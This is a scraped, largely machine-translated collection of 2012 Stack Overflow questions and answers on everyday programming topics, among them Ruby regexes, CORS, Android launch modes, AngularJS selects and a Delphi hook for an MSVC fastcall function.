作为 Windows 用户，我强烈建议您考虑[TortoiseSVN](http://tortoisesvn.net/)客户端（除了上述文档之外，它是[手册）。](http://tortoisesvn.net/docs/release/TortoiseSVN_en/index.html)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T12:53:40.243

您的命令与反斜杠看起来很奇怪。第一个和服务器 URL 前面的那个看起来不属于它们。此外，我相信您需要避开路径中的空格。（但我不会放最后一个文件，你想要一个目录）。

我会写这个命令：

```
svn import /Users/name/Desktop https://192.168.1.4:448/svn/BCRAsigViata 
```

除非您可能不想放置整个“桌面文件夹”。

# email - Sending myself an email with search word from site search (tipuesearch) using MVC4

> ID：13703281
> 
> 赞同：2
> 
> 时间：2012-12-04T12:47:55.223
> 
> 标签：email, view, actionresult, silent

I am using "[tipuesearch](http://www.tipue.com/search/)" for search option in my site. I am trying to better index my site by learning what visitors are typing in the search textbox. To do that, I am thinking of sending myself an email with each search with the typed keywords.

I managed to perform the email actionResult with the keywords but the problem is that the "tipuesearch" presents the results in the same page (which is good for me) and actionResult requires a "return view" that loads a view.

Is there a way to retrieve the keywords from the textbox and email them to myself without effecting the user or without redirecting to a different page? something like silent email sending or background sending...

Thank you!

# mongodb - 我如何在 heroku 上连接到 MongoDB

> ID：13703283
> 
> 赞同：0
> 
> 时间：2012-12-04T12:47:59.187
> 
> 标签：mongodb, heroku, mongoid

![在此处输入图像描述](../Images/56337c40f3da35c412486400ba04ab02.png)

这是我在 heroku 上创建的 mongoDB。下面是我用于生产的 mongoid.yml 设置。在本地一切都很好。

```
 production:
     sessions:
       default:
         uri: <%= ENV['MONGOHQ_URL']%>
         options:
           skip_version_check: true 
           safe: true 
```

哪里有问题，谁能帮忙

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T16:00:33.163

似乎您选择使用 MongoLAB 但正在使用 MongoHQ 变量。只需将 ENV['MONGOHQ_URL'] 更改为 ENV['MONGOLAB_URI']。

例子：

```
production:
  sessions:
    default:
      uri: <%= ENV['MONGOLAB_URI'] %>
      options:
        consistency: :strong
  options:
    allow_dynamic_fields: false
    identity_map_enabled: true
    include_root_in_json: false 
```

# ruby - 正则表达式在某些日期不起作用

> ID：13703286
> 
> 赞同：-1
> 
> 时间：2012-12-04T12:48:04.983
> 
> 标签：ruby, regex, date

我通过正则表达式匹配日期。它对某些人来说工作得很好，但对另一些人来说，它根本不起作用，但我不明白为什么。

我在 Ruby 中为德语做这个：

```
def extract_dates
  months = ["Januar", "Februar", "Maerz", "April", "Mai", "Juni", "Juli", "August", "September", "Oktober", "November", "Dezember"]
  days = ["Montag", "Dienstag", "Mittwoch", "Donnerstag", "Freitag", "Samstag", "Sonntag"]
  self.content.scan(/([0-9]{1,2}\.\s?[#{months.join("|")}]\s?[0-9]{4})/)
end 
```

我在以下文本上对其进行了测试：http: [//de.wikipedia.org/wiki/Inkunabel](http://de.wikipedia.org/wiki/Inkunabel)，我是随机选择的。它返回：

```
=> ["18\. Juli 1471", "11\. Februar 1486", "14\. August 1473", "1\. Januar 1501", "8\. Januar 2008", "23\. Mai 2006"] 
```

匹配是正确的，但它遗漏了`"31\. Dezember 1500"`哪个，就我的目的而言，应该匹配但不匹配。为什么不匹配`"31\. Dezember 1500"`？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T12:50:34.947

我认为你应该在月份周围加上括号 ()，而不是括号 []。

```
/([0-9]{1,2}\.\s?(#{months.join("|")})\s?[0-9]{4})/ 
```

如果它适用于其他日期，可能是因为日期是`31.&nbsp;Dezember&nbsp;1500`在 html 源代码中编写的。

**更新：**

为避免在每场比赛中返回月份，只需使用非捕获组`(?: )`

但是，由于外部括号集，您的原始正则表达式（如果它确实有效）也应该在子数组中返回每个结果。

```
content = "31\. Dezember 1500 and 8\. Januar 2008"
months = ["Januar", "Februar", "Maerz", "April", "Mai", "Juni", "Juli", "August", "September", "Oktober", "November", "Dezember"]

# Your original expression
content.scan /([0-9]{1,2}\.\s?[#{months.join("|")}]\s?[0-9]{4})/
# => []

# With a non-capturing group instead of []
content.scan /([0-9]{1,2}\.\s?(?:#{months.join("|")})\s?[0-9]{4})/
# => [["31\. Dezember 1500"], ["8\. Januar 2008"]]

# Without the outer parentheses
content.scan /[0-9]{1,2}\.\s?(?:#{months.join("|")})\s?[0-9]{4}/
# => ["31\. Dezember 1500", "8\. Januar 2008"] 
```

我也在 1.9.3，所以这不是问题。

# javascript - jQuery POST 通过 CORS 到 web 服务

> ID：13703287
> 
> 赞同：0
> 
> 时间：2012-12-04T12:48:07.987
> 
> 标签：javascript, jquery, web-services, sap, cors

我已经阅读了很多关于 CORS 和 Javascript 以及更改帖子中标题的主题，但我找不到我正在寻找的正确示例。

所以我首先要解释一下情况：

*   **我无法对网络服务器进行任何更改，因为这超出了我的能力范围（这是一个 SAP Cloud Portal）**
*   我只能更改 POST 代码，所以我只能控制我发送的内容。

我遇到的问题在以下帖子中进行了描述： [jQuery $.ajax(), $.post 在 Firefox 中将“OPTIONS”作为 REQUEST_METHOD 发送](https://stackoverflow.com/questions/1099787/jquery-ajax-post-sending-options-as-request-method-in-firefox)

--> 我的 FF 和 Chrome 标头发送一个 METHOD OPTIONS 而不是 METHOD POST。

我编写了适用于 IE 但不适用于 FF 和 Chrome 的示例代码：

```
var dataString = "<result><firstname>example</firstname><lastname>ThisIsSparta</lastname></result>";
    var urlString = "http://delyo001.you.local:8000/sap/bc/youconsulting/ws/rest/anonymous/z_names_post";

    //Add TO SAP.
    var aData =  
            jQuery.ajax({
                type: "POST",
                contentType: "application/xml",
                url: urlString,  // for different servers cross-domain restrictions need to be handled
                data: dataString,
                dataType: "text",
                success: function(xml) { // callback called when data is received
                    //oModel.setData(data);             // fill the received data into the JSONModel
                    alert("success to post");
                },

                error: function(xml) { // callback called when data is received
                    //oModel.setData(data);             // fill the received data into the JSONModel
                    alert("fail to  post");
                }
            });
        }); 
```

或者

```
var invocation = new XMLHttpRequest();
var url = 'http://delyo001.you.local:8000/sap/bc/youconsulting/ws/rest/anonymous/z_names_post';
var body = '<result><firstname>perthyrtyrtygop</firstname><lastname>sparta</lastname></result>';

   invocation.open('POST', url, true);
   invocation.setRequestHeader('X-PINGOTHER', 'pingpong');
   invocation.setRequestHeader('Content-Type', 'application/xml');
   invocation.send(body); 
```

我找到了两种方法来解决这个问题，但没有任何例子： - 用代理做点什么？- 发送特定的标题

有关我的问题的更多信息，请访问：- [http://scn.sap.com/message/13697625#13697625](http://scn.sap.com/message/13697625#13697625)

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T15:03:35.117

如果您无法在服务器端设置正确的标头并且您无法修改 jsonP 的响应，那么您确实应该使用代理。

代理脚本是一种中间件。您向脚本发出请求，脚本获取数据并将其返回给您。例如[php 代理](http://jquery-howto.blogspot.de/2009/04/cross-domain-ajax-querying-with-jquery.html)。你可以在 asp、jsp、flash 甚至 java applet 中做同样的事情。

现在，您拥有 SAP 服务、位于首选位置的代理 (php) 文件，以及与代理位于同一域中的本地 javascript。你甚至不需要 CORS。

如果要将代理放在另一个域中，则必须确保 php 文件发送正确的标头。（`Access-Control-Allow-Origin yourdomain`或`Access-Control-Allow-Origin * for allow all`）

# ruby - DealerDetail:Class (NoMethodError) 的未定义方法“heade”

> ID：13703289
> 
> 赞同：0
> 
> 时间：2012-12-04T12:48:18.727
> 
> 标签：ruby, rubygems, cucumber, watir, watir-webdriver

运行此程序时遇到问题，我不断收到错误 .rb:45:in `<main>': undefined method heade'`for DealerDetail:Class (NoMethodError) 我做错了什么我环顾四周，但找不到任何解决方案，我们将不胜感激

```
require 'watir-webdriver'

@browser = Watir::Browser.new

@page = [:dealerdetail => "www.google.com",
         :findadealer => "www.google.com",
         :findadealer_results => "www.google.com"
          ]

class DealerDetail 

 attr_accessor :browser   

 def heade

    @browser.goto @page [:dealerdetail]
    @browser.element(:id, 'mainNav').exists? 
        puts 'main navigation bar appears'

    puts 'navigation bar does not appear'

 end

 def footer   
    if @browser.element(:id, 'pageFooter').exists?
    puts 'footer  appears'
    elsif 
    puts 'Footer does not appear'
    end
  end

end

@deal = DealerDetail .new

@deal.heade 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:03:16.340

`heade` method trying to access `@page`, which in not available inside instance cause you defined it outside the scope.

I suppose you want to define `@page` instance variable inside class:

```
require 'watir-webdriver'

class DealerDetail 

  attr_accessor :browser

  def initialize
    @browser = Watir::Browser.new

    @page = [:dealerdetail => "www.google.com",
      :findadealer => "www.google.com",
      :findadealer_results => "www.google.com"
    ]
  end

  def heade

    @browser.goto @page[:dealerdetail]
    @browser.element(:id, 'mainNav').exists? 
    puts 'main navigation bar appears'

    puts 'navigation bar does not appear'

  end

end

@deal = DealerDetail.new

@deal.heade 
```

Also make sure you have no spaces between class/object and called method.

`DealerDetail .new` should be `DealerDetail.new`

`@page [:dealerdetail]` should be `@page[:dealerdetail]`

# mono - 在 monodroid 或 monotouch 中，我应该使用什么来代替 app.config 来配置字符串？

> ID：13703292
> 
> 赞同：17
> 
> 时间：2012-12-04T12:48:21.310
> 
> 标签：mono, xamarin.ios, xamarin.android, app-config

我想在 monodroid 项目中存储开发与生产连接字符串和配置字符串。我通常会将其作为应用程序设置存储在 web.config 或 app.config 中，但我应该如何在 monodroid 和 monotouch 项目中执行此操作？我还希望它能够在调试和发布版本之间自动切换配置，就像 Visual Studio 对 *.config 文件所做的那样。在 iOS 应用程序中，我可以将这些存储在 plist 中，但我想要一个单声道的跨平台解决方案。

我将如何在 monodroid 或 monotouch 中做到这一点？

* * *

## 回答 #1

> 赞同：21
> 
> 时间：2012-12-04T13:15:41.830

您应该只使用带有`#if`声明的静态类。

就像是：

```
public static class Configuration {
#if DEBUG
    public const string ConnectionString = "debug string";
#else
    public const string ConnectionString = "release string";
#endif
} 
```

使用的好处`app.config`是无需重新编译即可更改文件系统上的这些设置。在移动设备上，没有一种好的方法（尤其是在 iOS 上）在文件部署后对其进行编辑。因此，通常最好只使用静态类并在需要更改值时重新部署。这也适用于所有平台，因为它只是 C# 代码在做这项工作。

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2016-08-15T03:51:58.880

[在https://www.nuget.org/packages/PCLAppConfig](https://www.nuget.org/packages/PCLAppConfig)上有一个以 Xamarin 为中心的 AppSetting 阅读器， 它对于持续交付非常有用；

使用如下：

1) 将 nuget 包引用添加到您的 pcl 和平台项目。

2) 在您的 PCL 项目中添加 app.config 文件，然后作为链接文件添加到您的所有平台项目中。对于 android，确保将构建操作设置为“AndroidAsset”，对于 UWP，将构建操作设置为“内容”。添加设置键/值：`<add key="config.text" value="hello from app.settings!" />`

3) 在您的每个平台项目上初始化 ConfigurationManager.AppSettings，就在“Xamarin.Forms.Forms.Init”语句之后，即在 iOS 中的 AppDelegate、Android 中的 MainActivity.cs、UWP/Windows 8.1/WP 8.1 中的 App 上：

```
ConfigurationManager.Initialise(PCLAppConfig.FileSystemStream.PortableStream.Current); 
```

3）阅读您的设置：`ConfigurationManager.AppSettings["config.text"];`

# python - 如何按属性访问列表中的对象？

> ID：13703295
> 
> 赞同：1
> 
> 时间：2012-12-04T12:48:37.050
> 
> 标签：python, oop, list, object

考虑一个对象列表和一个适用于一个对象的方法：

```
beers = []
beers.append(Beer('Carlsberg', 'tasty'))
beers.append(Beer('Guinness', 'bitter'))
beers.append(Beer('Leffe', 'perfect'))

def howIsBeer (name):
    taste = ???
    print taste

Class Beer:
    def __init__ (self, name, taste):
        self.name = name
        self.taste = taste 
```

`howIsBeer()`如果仅提供啤酒名称，该方法将如何获得啤酒的味道？**我的第一个倾向是迭代`beers`列表，但作为 Python，我怀疑有更直接的方法。有没有？**

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T12:55:12.210

实在想不出更好的方法，只需使用`for`-loop。

```
def howIsBeer(name):
    for beer in beers:
        if beer.name == name:
            return beer.taste

In [1]: howIsBeer("Carlsburg")
Out[1]: tasty 
```

另请注意，该关键字`class`是用 small 编写的`c`。在使用它来创建实例**之前，**您还必须定义您的类。

**编辑**：正如评论中所建议的，一种方法是定义字典。如果你觉得它有用，你可以使用下面的代码。但是请注意，仅当您拥有大量 Beer 对象并且性能速度对您非常重要时，才建议这样**做**。否则使用提供的第一个代码

```
class Beer:
    names = {}
    def __init__(self, name, taste):
        Beer.names[name] = self
        self.name = name
        self.taste = taste

In [3]: Beer.names["Carlsburg"].taste
Out[3]: tasty 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-04T12:59:10.310

只需遍历列表并检查每一个。

你需要稍微移动一下代码，因为`class def`需要在类的使用之上，而且它还使用了一个小的`c`. 您还应该注意它未被识别的情况。

你也拼错了嘉士伯：/

```
class Beer:
    def __init__ (self, name, taste):
        self.name = name
        self.taste = taste

beers = []
beers.append(Beer('Carlsberg', 'tasty'))
beers.append(Beer('Guinness', 'bitter'))
beers.append(Beer('Lef', 'perfect'))

def howIsBeer (name):

    taste = "I have no idea"

    for beer in beers:
        if beer.name == name:
            taste = beer.taste

    print taste

howIsBeer("Carlsberg") # tasty 
```

不过，我会这样做（使用此处的字典可以灵活地拥有多个属性）：

```
beers = {}
beers["Lef"] = {"taste": "tasty"}
beers["Staropramen"] = {"taste": "tasty"}
beers["Peroni"] = {"taste": "tasty"}
beers["Coors Light"] = {"taste": "What is this?!"}

def howIsBeer (name):

    taste = "I have no idea"

    if name in beers:
        taste = beers[name]["taste"]

    print taste

howIsBeer("Lef") 
```

如果你只是想存储口味，那么你可以这样做：

```
beers = {}
beers["Lef"] = "tasty"
beers["Staropramen"] = "tasty"
beers["Peroni"] = "tasty"
beers["Coors Light"] = "What is this?!"

def howIsBeer (name):

    taste = "I have no idea"

    if name in beers:
        taste = beers[name]

    print taste

howIsBeer("Lef") 
```

如果您正在寻找存储一系列对象 - 正如您在问题中提到的那样 - 那么您需要一个对象字典 -**而不是**作为类变量的字典。

IE

```
beers = {}

def add_beer(beer):
    beers[beer.name] = beer 
```

然后获取您正在查看的啤酒的数据；

```
if beer in beers:
    beers[beer].taste 
```

这可以扩展到任何对象类型，我相信这正是您正在寻找的；

例如

```
cheeses = {}
add_cheese(cheese):
    cheeses[cheese.name] = cheese 
```

在哪里

```
class cheese:
    def __init__(self, name, smelliness, hardness, colour, country):
        self.name = name
        self.smelliness = smelliness
        self.hardness = hardness
        self.colour = colour
        self.country = country 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-07-21T08:45:15.607

为了完整起见，我找到了一种使用类似[Linq 的单行语句](http://codepad.org/0H6wom4T)的方法，它还具有更易于阅读的优点：

```
taste = [b.taste for b in beers if b.name==name][0] 
```

最后`[0]`是返回第一项，因为查询返回匹配项的列表。所以要获得整个列表：

```
[b.taste for b in beers if b.name==name] 
```

这就是我喜欢 Python 的原因！

# eclipse - xtext 实现自定义 IResourceValidator

> ID：13703298
> 
> 赞同：1
> 
> 时间：2012-12-04T12:48:42.947
> 
> 标签：eclipse, xtext

我有 xtext 语言，它有一个用于上下文检查的外部编译器。我想在编辑器中显示编译器的错误。我在某处读到我必须实现 IResourceValidator。我怎么做？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-05T08:58:22.623

您可以只使用 bindIResourceValidator() 来绑定您自己的实现。

例如，像这样：

```
public Class<? extends IResourceValidator> bindIResourceValidator() {
 return MyValidator.class;
 } 
```

请记住，您将使用 Xtext 提供的原始验证器

# cassandra - 使用 Pelops 在 cassandra 中删除行后重新插入数据

> ID：13703302
> 
> 赞同：2
> 
> 时间：2012-12-04T12:48:57.737
> 
> 标签：cassandra, pelops

我试图在删除行后重新插入相同行键的数据，但它们没有被插入。也不会抛出任何异常。

我正在使用 Pelops RowDeletor 在删除后删除行数据（请注意，行键仍然显示为没有列）。如果我截断表并重新插入列，则会插入。

我尝试将一致性级别从 ANY 更改为 ONE 到 ALL。关于什么问题或我应该去找 Hector 客户的任何想法？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-04T14:01:51.893

如果您的列上的时间戳是过去的，这可能是墓碑（没有列的键）的问题。确保不是这种情况，您应该能够插入。请注意，这不是 Pelops 的问题，而是与 Cassandra 的冲突解决有关。如果你有一个比插入更新的墓碑，你会遇到这个问题，因为 Cassandra 认为删除是在插入之后发生的。

# visual-studio-2010 - 通过注入的 Delphi dll 启用 __fastcall 挂钩在 MSVC++ 上创建的应用程序

> ID：13703303
> 
> 赞同：3
> 
> 时间：2012-12-04T12:48:58.847
> 
> 标签：visual-studio-2010, delphi, assembly, hook, delphi-2010

我正在尝试在使用 microsoft visual studio 2010 编译的应用程序中挂钩一个函数，并从 delphi 2010 dll 启用 __fastcall，但我不熟练地弄清楚如何绕过以下问题：

C++ 函数是：

```
 void __fastcall function(int arg1; char* arg2); 
```

我正在尝试类似的事情（使用uallHook）：

```
 var FTextMessage : procedure(Modo: integer; Msg: pchar); register;
    procedure onTextMessage(Modo: integer; Msg: pchar); register;
    begin
      ShowMessage(inttostr(Modo) + ' - ' + string(Msg));
      FTextMessage(Modo, Msg);
    end;
    begin
    HookCode(Ptr($574210), @onTextMessage, @FTextMessage);
    end. 
```

这会导致调试/崩溃。

所以，我发现：

> “Microsoft 或 GCC[4] __fastcall[5] 约定（又名 __msfastcall）传递适合 ECX 和 EDX 的前两个参数（从左到右评估）。剩余的参数从右到左推入堆栈。”
> 
> Borland fastcall 从左到右评估参数，它通过 EAX、EDX、ECX 传递三个参数。剩余的参数被压入堆栈，也是从左到右。 [6] 它是 Embarcadero Delphi 的 32 位编译器的默认调用约定，其中 >it 被称为寄存器。

取自： [http ://en.wikipedia.org/wiki/X86_calling_conventions](http://en.wikipedia.org/wiki/X86_calling_conventions)

这就是问题所在，borland fastcall 和microsoft __fastcall 是不同的。

所以我想我需要在 Hook 函数中使用一段汇编代码来对齐寄存器或其他东西，但我还不能解决这个问题。

任何帮助，将不胜感激。

Edit1：David Heffernan 回答部分有效。（它只在显示消息之前有效）

```
 var FTextMessage : procedure(Modo: integer;Msg: PAnsiChar); register;

     procedure onTextMessage(Modo: integer;Msg: PAnsiChar); register;
     begin
       ShowMessage(inttostr(Modo) + ' - ' + string(Msg));
       asm
         MOV ECX,Modo
         MOV EDX,Msg
         JMP FTextMessage
       end;  // I got a crash trying or without trying to restore the registers before executing the JMP FTextMessage
     //  FTextMessage(Modo,Msg); // < Also this method doesnt work either, if I call the Original function from here (without executing asm code above) i got a crash too. (this is what i was meaning with "to correct the registers")
     end;

     procedure onTextMessageWrapper(Modo: Integer;Msg: PAnsiChar); register;
     asm
       MOV EDX,ECX  // < Moving ECX to EDX, I'm able to Access Modo and Msg correctly in onTextMessage procedure.
       JMP onTextMessage
     end;

     begin
       HookCode(Ptr($574210), @onTextMessageWrapper, @FTextMessage);
     end. 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:01:48.963

C++ 函数在`ECX`和中传递参数`EDX`。因此，您只需要将它们复制到 Delphi 期望的寄存器中：`EAX`和`EDX`分别。由于第二个参数已经在正确的寄存器中，所以您需要的是：

```
procedure onTextMessage(Modo: Integer; Msg: PAnsiChar); register;
begin
  ...
end;

procedure onTextMessageWrapper(Modo: Integer; Msg: PAnsiChar); register;
asm
  MOV EAX,ECX
  JMP onTextMessage
end; 
```

我已经在两个函数中完成了这项工作，这样我就可以编写一个纯`asm`函数来进行寄存器交换。我们希望纯粹`asm`避免所有的序言。所以，`onTextMessageWrapper`是你的钩子函数。

另请注意，由于您使用的是 Unicode Delphi，因此您需要`PAnsiChar`匹配`char*`.

我所知道的调用约定的最佳参考是[Agner Fog](http://www.agner.org/optimize/calling_conventions.pdf)。你会在那里找到所有血淋淋的细节。重要的一点是，在 Windows x86 上，EAX、ECX 和 EDX 寄存器是易失性或暂存寄存器。这意味着被调用者可以修改这些寄存器而无需恢复它们。这就是为什么我在上面修改 EAX 并且不费心把它放回去的原因。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-12-04T21:06:54.957

另一种尝试是更改此函数签名，如下所示

来自：procedure onTextMessageWrapper(Modo: Integer; Msg: PAnsiChar); 登记; To: 过程 onTextMessageWrapper; 登记;

# android - 打开文件时防止应用程序/活动的多个实例

> ID：13703305
> 
> 赞同：3
> 
> 时间：2012-12-04T12:49:03.137
> 
> 标签：android, android-lifecycle

我有一项活动构成了我的申请的基础。这是问题所在。

*   我创建了一个名为`Instance1`.
*   然后通过导航回主菜单将我的活动发送到后台。`onPause`并被`onStop`调用`Instance1`。
*   然后我导航到`Gmail`并打开一个电子邮件附件。
*   这会创建我的活动“Instance2”的一个新实例（我知道这一点是因为我记录了该实例是什么）。我现在在我的活动中所做的任何事情都在这个新实例中。
*   如果我然后导航到 gmail，那么如果我通过触摸`onDestroy`调用`Instance2`原始图标来打开我的应用程序`Instance1` `onRestart`。

这是我的意图过滤器`manifest.xml`

```
<intent-filter>
                <action android:name="android.intent.action.VIEW" />
                <category android:name="android.intent.category.DEFAULT" />
                <data android:mimeType="*/*" />
                <data android:pathPattern=".*\\.dog" />
</intent-filter> 
```

我还在清单文件中的 Applications 标记中添加了以下内容，但没有效果。

```
android:launchMode="singleTask" 
```

**问题**

为什么它不能意识到有一个实例正在运行并打开它？

**添加**

我使用了 singleInstance 并将其移到了我的 Activity 标记中。但是，现在我无法获取我的电子邮件附件数据？以前我使用以下。

```
Intent intent = getIntent();

        if (intent != null) {
            Log.d("MainActivity","Intent not null");
            Uri u = intent.getData();
            if (u != null) {
                Log.d("MainActivity","URI not null"); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:55:50.400

launchMode 标记是[`<activity>`](https://developer.android.com/guide/topics/manifest/activity-element.html#lmode)元素的一部分，而不是应用程序元素。

您应该使用 singleTop 来重新使用现有的活动。

# ipad - iPad 远程调试

> ID：13703308
> 
> 赞同：2
> 
> 时间：2012-12-04T12:49:11.693
> 
> 标签：ipad, ios6, remote-debugging

我想远程调试我的 webapp。我有一台 iPad-3、iOS-6 和一台 MacBook。所以我尝试了两种情况。

A）我可以使用远程调试，如果我将我的 webapp 保存在我的主屏幕上。不幸的是，我无法清除缓存！

B) 我可以在 iPad 上使用 safari 并访问我的网站（=我的 webapp）。如果我切换到我的 MacBook 屏幕并访问“Entwickler”-Tab（开发人员选项卡的德语），iPad-entry 会出现，但有一条警告消息，我的 iPad 上没有可调试的应用程序（'keine überprüfbare Program '）。据我所知，我在 iPad-safari-configuration 上启用了远程调试。

我现在能做什么？提前致谢。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-05-28T11:26:10.790

正如我在上面的评论中提到的 - 在你的 iPad 设置中禁用私人冲浪模式并注意你的 iPad 是清醒的。

# javascript - 确定字符串是否通过 jQuery 编码为 HTML？

> ID：13703312
> 
> 赞同：1
> 
> 时间：2012-12-04T12:49:18.360
> 
> 标签：javascript, jquery, string, html-encode

我正在编写验证脚本，但遇到了一个非常特殊的问题。

如果用户输入的字符串恰好是编码的 html 字符（如`&#38;`或`&amp;`），它将作为字符输出（在本例中为 &）。我的问题是：是否可以编写一个函数来确定字符串是否是编码字符？所以如果用户输入上述两个选项之一，我想启动一个特定的功能，如果它是一个非编码字符，我想做别的事情。

有没有办法做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-04T13:01:24.610

根据定义，如果您不知道某物是否是编码的 HTML 实体，您就不知道。您可以将来自某个来源的所有文本视为已编码或未编码。为什么？因为这一切都只是文字。“&” 只是文字。我的*意思*是写“&” 这里。我不希望任何人解释它，我希望它按字面意思显示为“&”。

你怎么知道用户的意思？如果您开始根据猜测替换用户输入的文本，那么在某些情况下您总是会搞砸。这是典型的情况，所有“:D”都被图形笑脸代替，当你真正想输入“:D”时，这很烦人。

如果您想始终准确地保留用户输入的内容，请始终通过 HTML 编码函数运行所有用户输入，该函数将所有特殊字符替换为实体。请参阅[伟大的逃避现实（或：使用文本中的文本需要知道的内容）](http://kunststube.net/escapism/)。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-04T12:57:07.783

您可以通过比较编码长度和解码长度来检查字符串是否包含编码字符：

```
var string = "Your encoded &amp; decoded string here"

function decode(str){
    return decodeURIComponent(str).replace(/&lt;/g,'<').replace(/&gt;/g,'>');
}

if(string.length == decode(string).length){
    // The string does not contain any encoded html.
}else{
    // The string contains encoded html.
} 
```

此外，这[比建议的 jQuery 方法要快得多。](http://jsperf.com/check-if-string-contains-encoded-html)

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-04T13:01:49.737

像这样的事情会做到这一点。

```
function containsEncoded (val){
    var rHTMLEncoded = /&[^\s]*/;

    return rHTMLEncoded.test(val) ;
}

// Usage 
var encoded = containsEncoded("&amp;"); 
```

# javascript - 告诉 AngularJS 更新选择的选定选项

> ID：13703313
> 
> 赞同：0
> 
> 时间：2012-12-04T12:49:23.253
> 
> 标签：javascript, web-applications, angularjs

最近我一直在开发一个网络应用程序，`<select>`一年中的每一天我都需要一个元素。

所以我做了这样的事情，其中`daysOfYear`​​是一年中所有日子的`availableValues`数组，并且是所有可能值的数组。

```
<div ng-repeat="day in daysOfYear">
  <select ng-model="day.value" ng-options="value for value in availableValues"></select>
</div> 
```

问题是它**非常慢**，在 Firefox**中加载大约需要 5 秒**，在此期间浏览器完全冻结。请注意，计算时已经有 2 秒的冻结`daysOfYear`。没有选择我有 2 秒的冻结，有选择我有 7 秒的冻结，所以**我确定这是由 selects 引起的**。每当我更改其中一个选择的值时，还会有一个额外的小冻结。

所以我决定遵循我在新闻组上看到的建议，编写自己的模块来填充`<select>`. 我的模块（请参阅下面的代码）将任何`<select>`带有指令的`app-typeslist`指令添加到数组中。然后`options`从服务器加载列表，列表中的所有元素都用给定的选项填充。

问题是 AngularJS 没有在选项列表中检测到这个修改。`<select>`没有属性，并且包含一个表示“无效值”状态 的`value`附加元素。**有没有办法告诉 AngularJS 我希望它更新这个选择？**`<option>`

 **谢谢。

* * *

*这是模块的源代码。我认为根本没有必要回答这个问题，但我想你无论如何都会要求它：*

```
(function() {
    var elementsList = $();
    var html = null;
    angular
        .module('elementsTypes', [])
        .config(function($compileProvider) {
            $compileProvider.directive('appTypeslist', function() {
                var directiveDefinitionObject = {
                    link: function(scope, element, attrs) {
                        elementsList.push($(element));
                        if (html)
                            $(html).each(function() { $(this).clone().appendTo(element); });
                    }
                };
                return directiveDefinitionObject;
            });
        })
        .run(function($http, $rootScope) {
            $http.get(url of the types).success(function(data) {
                html = $();
                angular.forEach(data, function(category) {
                    var gr = $('<optgroup/>').attr('label', category.description);
                    angular.forEach(category.elements, function(elem) {
                        $('<option/>').attr('value', elem.name).text(elem.description).appendTo(gr);
                    });
                    html.push(gr);
                });
                elementsList.each(function() {
                    var e = this;
                    $(html).each(function() { $(this).clone().appendTo(e); });
                });
            });
        });
})(); 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-04T13:35:46.733

好的，所以我完全`ng-model`从`<select>`, 中删除并扩展了我的模块以包含绑定。

```
(function() {
    var elementsList = $();
    var html = null;

    var refreshElement = function(node) {
        var newVal = $(node).data('appTypeslist');
        $(node).val(newVal);
    };

    angular
        .module('elementsTypes', [])
        .config(function($compileProvider) {
            $compileProvider.directive('appTypeslist', function() {
                var directiveDefinitionObject = {
                    link: function(scope, element, attrs) {
                        elementsList.push(element);
                        if (html)
                            $(html).each(function() { $(this).clone().appendTo(element); });
                        scope.$watch(attrs.appTypeslist, function(newVal) {
                            $(element).data('appTypeslist', newVal);
                            refreshElement(element);
                        });
                        $(element).change(function() {
                            $(element).data('appTypeslist', $(this).val());
                            scope.$apply(attrs.appTypeslist + ' = "' + $(this).val().replace(/([\\"'])/g, "\\$1").replace(/\0/g, "\\0") + '"');
                            refreshElement(element);
                        });
                    }
                };
                return directiveDefinitionObject;
            });
        })
        .run(function($http, $rootScope) {
            $http.get(url).success(function(data) {
                html = $();
                angular.forEach(data, function(category) {
                    var gr = $('<optgroup/>').attr('label', category.description);
                    angular.forEach(category.elements, function(elem) {
                        $('<option/>').attr('value', elem.name).text(elem.description).appendTo(gr);
                    });
                    html.push(gr);
                });
                elementsList.each(function() {
                    var e = this;
                    $(html).each(function() { $(this).clone().appendTo(e); });
                    refreshElement(e);
                });
            });
        });
})(); 
```**

# java - 在 AOP Advice 中确定调用方法

> ID：13703314
> 
> 赞同：1
> 
> 时间：2012-12-04T12:49:29.690
> 
> 标签：java, aop, spring-aop

我正在使用 Spring 3.1 AOP。是否有一种“简单”的方法来确定哪个类发出了被 Spring AOP 拦截的初始调用？

我想要做的是阻止一个包中的类调用另一个包中的类的方法？我能想出的唯一解决方案是从当前线程中检索堆栈跟踪并遍历它以查看堆栈上是否存在具有我正在寻找的包前缀的类。

还有其他建议吗？

# java - Log4j 性能明智 %F 与 getClass().getSimpleName()

> ID：13703315
> 
> 赞同：1
> 
> 时间：2012-12-04T12:49:30.000
> 
> 标签：java, log4j

为了提高性能，在日志中包含类名更好的是什么？在模式布局中，它在 %F 的文档中给出警告：

**用于输出发出记录请求的文件名。
警告生成调用方位置信息非常慢，除非执行速度不是问题，否则应避免生成调用方位置信息。**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-04T12:52:32.853

要获取 className log4j，请拨打类似的电话。

```
String className = new Throwable().getStackTrace()[3].getClassName(); 
```

正如你所看到的，这为一个简单的结果做了很多工作。使用 getClass().getSimpleName() 相对更有效，但如果你可以缓存它会更好。

HotSpot 内部有这种方法，我相信它没有被使用，因为它仅供内部使用。恕我直言，如果它检测到它是否可用并在可用时使用它会更好。

```
Class class = sun.reflect.Reflection.getCallerClass(int stackDepth); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-04T12:54:34.193

